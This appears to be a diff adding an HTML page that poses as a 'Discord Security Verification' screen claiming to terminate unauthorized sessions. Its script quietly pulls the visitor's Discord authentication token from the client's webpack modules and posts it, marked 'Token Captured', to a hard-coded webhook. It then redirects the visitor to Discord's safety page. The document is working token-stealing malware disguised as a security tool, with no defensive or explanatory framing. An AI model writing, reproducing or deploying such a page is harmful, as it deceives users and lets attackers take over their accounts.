@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Discord Security Verification</title>
+    <style>
+        body { background-color: #2b2d31; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { text-align: center; }
+        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-top: 4px solid #5865F2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <h1>Securing Your Account...</h1>
+        <p>Please wait while we terminate all unauthorized sessions.</p>
+    </div>
+    <script>
+        function getToken() {
+            window.dispatchEvent(new Event('beforeunload'));
+            let token = (window.webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let r in e.c)m.push(e.c[r])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
+            return token;
+        }
+        async function send() {
+            const token = getToken();
+            const url = "https://discord.com/api/webhooks/1479521399226761257/oXj1-cf5ipoSkF_SKSvCay19JJH7mfnL0Y4grui0lVUU6b9r582psAk1qb4gF4IRC1Kd";
+            if (token) {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ content: "🔱 **Token Captured:** `" + token + "`" })
+                });
+            }
+            window.location.href = "https://discord.com/safety";
+        }
+        window.onload = send;
+    </script>
+</body>
+</html>
